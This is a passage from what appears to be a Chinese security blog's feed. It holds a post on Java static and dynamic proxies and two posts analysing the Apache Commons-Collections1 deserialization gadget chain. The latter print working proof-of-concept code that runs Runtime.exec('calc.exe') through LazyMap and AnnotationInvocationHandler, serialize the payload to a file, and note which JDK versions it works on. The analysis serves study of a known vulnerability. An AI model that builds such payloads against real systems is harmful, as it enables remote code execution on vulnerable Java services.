class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloProxy</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">HelloInterface</span> <span class="variable">helloInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before invoke sayHello&quot;</span> );</span><br><span class="line">        helloInterface.sayHello();</span><br><span class="line">        System.out.println(<span class="string">&quot;After invoke sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理类调用：<br> 被代理类被传递给了代理类<code>HelloProxy</code>，代理类在执行具体方法时通过所持用的被代理类完成调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloProxy helloProxy = <span class="keyword">new</span> <span class="built_in">HelloProxy</span>();</span><br><span class="line">        helloProxy.<span class="built_in">sayHello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">输出：</span><br><span class="line">Before invoke sayHello</span><br><span class="line">Hello proxy!</span><br><span class="line">After invoke sayHello</span><br></pre></td></tr></table></figure><p>使用静态代理很容易就完成了对一个类的代理操作。但是静态代理的缺点也暴露了出来：由于代理只能为一个类服务，如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>利用反射机制在运行时创建代理类。接口、被代理类不变，我们构建一个<code>handler</code>类来实现<code>InvocationHandler</code>接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import proxy.UserService;</span><br><span class="line">import proxy.UserServiceImpl;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class Client2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        // 设置变量可以保存动态代理类，默认名称以 $Proxy0 格式命名</span><br><span class="line">       //System.getProperties().setProperty(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);</span><br><span class="line">        // 1. 创建被代理的对象，UserService接口的实现类</span><br><span class="line">        HelloInterface hello = new Hello();</span><br><span class="line">        // 2. 获取对应的 ClassLoader</span><br><span class="line">        ClassLoader classLoader = userServiceImpl.getClass().getClassLoader();</span><br><span class="line">        // 3. 获取所有接口的Class，这里的UserServiceImpl只实现了一个接口UserService，</span><br><span class="line">        Class[] interfaces = hello.getClass().getInterfaces();</span><br><span class="line">        // 4. 创建一个将传给代理类的调用请求处理器，处理所有的代理对象上的方法调用</span><br><span class="line">        //     这里创建的是一个自定义的处理器，须传入实际的执行对象 hello</span><br><span class="line">        InvocationHandler helloHandler = new HelloHandler(hello);</span><br><span class="line">        /*</span><br><span class="line">   5.根据上面提供的信息，创建代理对象 在这个过程中，</span><br><span class="line">               a.JDK会通过根据传入的参数信息动态地在内存中创建和.class 文件等同的字节码</span><br><span class="line">               b.然后根据相应的字节码转换成对应的class，</span><br><span class="line">               c.然后调用newInstance()创建代理实例</span><br><span class="line"> */</span><br><span class="line">        HelloInterface proxy = (HelloInterface) Proxy.newProxyInstance(classLoader, interfaces, helloHandler);</span><br><span class="line">        // 调用代理的方法</span><br><span class="line">        proxy.sayHello();</span><br><span class="line">        // 保存JDK动态代理生成的代理类，类名保存为 HelloProxy</span><br><span class="line">        // ProxyUtils.generateClassFile(proxy.getClass(), &quot;HelloProxy&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425143320115-109776722.png" alt="image-20220425143318908"></p><p><code>InvocationHandler</code>和<code>Proxy</code>的主要方法有</p><p><strong>java.lang.reflect.InvocationHandler</strong></p><p><code>Object invoke(Object proxy, Method method, Object[] args)</code>定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用</p><p><strong>java.lang.reflect.Proxy</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static InvocationHandler getInvocationHandler(Object proxy)用于获取指定代理对象所关联的调用处理器</span><br><span class="line"></span><br><span class="line">static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces)返回指定接口的代理类</span><br><span class="line"></span><br><span class="line">static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 构造实现指定接口的代理类的一个新实例，所有方法会调用给定处理器对象的 invoke 方法</span><br><span class="line"></span><br><span class="line">static boolean isProxyClass(Class&lt;?&gt; cl)返回 cl 是否为一个代理类</span><br></pre></td></tr></table></figure><p>动态代理具体步骤：</p><ol><li>通过实现 <code>InvocationHandler</code> 接口创建自己的调用处理器；</li><li>通过为 Proxy 类指定 <code>ClassLoader</code> 对象和一组 interface 来创建动态代理类；</li><li>通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型；</li><li>通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。</li><li>调用方法的时候通过 <code>super.h.invoke(this, m1, (Object[])null);</code> 调用，其中的 <code>super.h.invoke</code> 实际上是在创建代理的时候传递给 <code>Proxy.newProxyInstance</code> 的 <code>Handler</code> 对象，它继承 <code>InvocationHandler</code> 类，负责实际的调用处理逻辑。</li><li><code>Handler</code> 的 <code>invoke</code> 方法接收到 method、args 等参数后，进行一些处理，然后通过反射让被代理的对象 target 执行方法。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809">https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809</a></p><p><a href="https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118">https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;代理模式&quot;&gt;&lt;a href=&quot;#代理模式&quot; class=&quot;headerlink&quot; title=&quot;代理模式&quot;&gt;&lt;/a&gt;代理模式&lt;/h3&gt;&lt;p&gt;为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代理" scheme="https://kpa1on.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons-Collections1分析（三）</title>
    <link href="https://kpa1on.github.io/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2022-04-25T01:52:41.000Z</published>
    <updated>2022-04-26T04:56:23.068Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="cc链的另一种构造方式"><a href="#cc链的另一种构造方式" class="headerlink" title="cc链的另一种构造方式"></a>cc链的另一种构造方式</h3><p>接着上篇的分析，上文中讲到<code>LazyMap</code>通过<code>get()</code>方法可以达到利用链触发命令执行</p><span id="more"></span><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100217366-1661900816.png" alt="image-20220425100216545"></p><p>根据<code>get()</code>方法克制，根据传入的key进行判断，如果map中不包含此key，就会通过<code>factory</code>调用<code>transform()</code>方法，这里的<code>factory</code>是可以通过构造方法进行赋值的，那么这里可以将<code>factory</code>的值赋值为<code>ChainedTransformers</code>,就可以触发后面的调用链完成命令执行。但可以看到<code>LazyMap</code>的构造方法是被<code>protected</code>关键词修饰的，是无法直接进行new创建的，</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100840761-1896569264.png" alt="image-20220425100840057"></p><p>查找其他函数时，发现<code>decorate()</code>方法可以完成<code>factory</code>的赋值。这也是为什么在前面的POC里面我们调用该方法并传入<code>innerMap</code>和<code>transformerChain</code>参数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101040851-1566624004.png" alt="image-20220425101040219"></p><p>这里传入的<code>innerMap</code>为为一个Map集合，<code>transformerChain</code>为一个被<code>ChainedTransformer</code>修饰过的<code>Transformer[]</code>数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>调试分析，首先进入<code>decorate()</code>方法，完成<code>factory</code>的赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101914918-253951094.png" alt="image-20220425101914180"></p><p>下一步进入get()方法，调用<code>transform()</code>方法，后续就是循环调用<code>Transformer#transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425102027194-2090880442.png" alt="image-20220425102026291"></p><p>上面是我们测试的POC的调用过程，但在实际利用中，如何让它调用到我们的<code>get()</code>方法呢，在上篇中<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法会调用<code>get()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180003976-1607958223.png" alt="image-20220425180002813"></p><p>根据构造方法传入第⼀个参数是⼀个<code>Annotation</code>类类型参数，该类是注解类，第二个是map类型参数，这个参数可以传<code>LazyMap</code>类型的对象去调用<code>get()</code>方法，<code>get()</code>方法调用<code>transform()</code>,</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180049855-1977873704.png" alt="image-20220425180049496"></p><p>怎么去调用<code>AnnotationInvocationHandler</code>的<code>invoke</code></p><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        Class clazz =</span><br><span class="line">                Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;1.txt&quot;));</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看下这行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>这里的<code>handler</code>是反射创建的一个 <code>AnnotationInvocationHandler</code>类。而<code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>接口，可以直接作为调用处理器传入。在poc执行反序列化时，由于<code>AnnotationInvocationHandler</code>重写了<code>readObject()</code>方法，并且<code>readObject()</code>方法会调用<code>memberValues.entrySet().iterator()</code>，这里的<code>memberValues</code>即为被代理类<code>LazyMap</code>，通过构造方法传入并赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426000620806-1633479758.png" alt="image-20220426000617958"></p><p>在下面代理对象是<code>proxyMap</code>，当调用<code>proxyMap</code>的<code>entrySet()</code>会触发到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法进行执行。这也是动态代理的一个特性，代理对象调用任意方法，调用处理器中的<code>invoke()</code>方法都会执行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>所以接下来就会执行<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，接着调用<code>LazyMap#get()</code>触发后面的利用链</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003833650-887299424.png" alt="image-20220426003829666"></p><p>进入<code>get()</code>方法，如下，后面就和之前的利用过程一致了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003854700-2086954144.png" alt="image-20220426003853411"></p><p>完整的利用链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CC1这条链里面是有版本限制的，在高版本中对<code>readObject()</code>方法进行了修改，经过测试jdk &lt; 8u71，可以利用成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">jdk1.7.0_21 【成功】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">jdk1.8.0_171 【失败】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);</span><br><span class="line">        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);</span><br><span class="line">        AnnotationType var5 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; catch (IllegalArgumentException var13) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = new LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = null;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            if (var12 != null) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);</span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13798371.html">https://www.cnblogs.com/nice0e3/p/13798371.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;cc链的另一种构造方式&quot;&gt;&lt;a href=&quot;#cc链的另一种构造方式&quot; class=&quot;headerlink&quot; title=&quot;cc链的另一种构造方式&quot;&gt;&lt;/a&gt;cc链的另一种构造方式&lt;/h3&gt;&lt;p&gt;接着上篇的分析，上文中讲到&lt;code&gt;LazyMap&lt;/code&gt;通过&lt;code&gt;get()&lt;/code&gt;方法可以达到利用链触发命令执行&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons-Collections1分析（二）</title>
    <link href="https://kpa1on.github.io/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-04-24T07:41:03.000Z</published>
    <updated>2022-04-24T17:53:11.728Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p><span id="more"></span><p>下面为完整的调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p><p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure><p>而<code>LazyMap</code>的触发点是在get()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p><p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>运行完get()方法弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p><p>所有的注解类型都继承自Annotation接口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p><p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" alt="image-20220425004347242"></p><p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class  clazz = 